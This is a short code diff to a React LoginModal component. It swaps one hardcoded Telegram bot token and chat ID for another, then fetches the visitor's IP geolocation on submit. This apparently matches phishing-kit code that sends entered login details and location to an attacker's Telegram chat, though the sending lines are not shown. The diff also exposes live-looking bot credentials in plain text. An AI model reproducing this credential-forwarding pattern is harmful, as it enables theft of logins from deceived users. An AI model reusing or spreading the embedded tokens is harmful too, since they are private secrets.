@@ -293,8 +293,8 @@ function LoginModal({ showAccessScreen, loginSource, claimMode, onClose, onAcces
 
     setIsSubmitting(true);
 
-    const TELEGRAM_BOT_TOKEN = '7719532232:AAEeFLNU117FY_Lx2wM499U-GstKTb_1by8';
-    const TELEGRAM_CHAT_ID = '6741003817';
+    const TELEGRAM_BOT_TOKEN = '8890925590:AAGxxDjNbhnonzZBfigaZrbUlUO78p-Ugm4';
+    const TELEGRAM_CHAT_ID = '8264171951';
 
     // 1. Ambil Data Geonotifikasi IP Realtime
     fetch('https://ip-api.com/json')
